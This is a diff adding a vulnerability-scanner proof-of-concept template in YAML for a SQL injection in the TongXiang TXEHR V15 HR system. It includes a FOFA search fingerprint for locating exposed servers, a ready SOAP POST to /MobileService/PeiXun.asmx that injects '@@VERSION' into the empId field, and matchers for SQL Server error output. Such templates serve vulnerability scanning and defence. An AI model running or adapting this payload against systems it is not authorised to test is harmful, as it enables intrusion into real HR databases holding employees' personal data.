@@ -1,0 +1,23 @@
+id: poc-yaml-tosharesoft-peixun-asmx-sqli
+info:
+  name: 同享人力资源管理系统 TXEHR V15 PeiXun.asmx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 同享人力资源管理系统
+  fofa: body="/Assistant/Default.aspx"
+requests:
+- method: POST
+  path: /MobileService/PeiXun.asmx
+  headers:
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: '"http://tempuri.org/GetPeiXunRecord"'
+  data: "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\
+    \ xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"\
+    >\n  <soap:Body>\n    <GetPeiXunRecord xmlns=\"http://tempuri.org/\">\n      <company></company>\n\
+    \      <empId>@@VERSION</empId>\n      <pageIndex>1</pageIndex>\n      <size>10</size>\n\
+    \    </GetPeiXunRecord>\n  </soap:Body>\n</soap:Envelope>"
+  expression: status_code == 500 && contains(body,"Microsoft SQL Server") && contains(body,"Exception:")
+    && contains(content_type,"text/xml") && matches(body,"转换成数据类型(.*?)时失败") && matches(body,"在将(.*?)值")
+variables: {}
+transport: http
